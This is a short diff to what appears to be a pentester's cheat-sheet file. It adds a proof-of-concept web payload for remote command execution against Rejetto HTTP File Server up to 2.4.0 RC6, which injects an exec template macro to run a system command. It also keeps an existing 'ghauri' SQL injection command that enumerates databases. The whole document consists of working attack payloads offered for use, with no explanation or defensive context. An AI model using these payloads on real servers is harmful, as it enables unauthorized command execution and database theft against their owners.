@@ -1,3 +1,7 @@
+burpsuite poc
+Rejetto HTTP File Server <= 2.4.0 RC6:
+/?n=%OA&cmd=systeminfo&search=%25xxx%25url:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}
+
 sqli
 ghauri -u 'url' -p id --batch --confirm --dbs --level 3 --dbms mysql
 
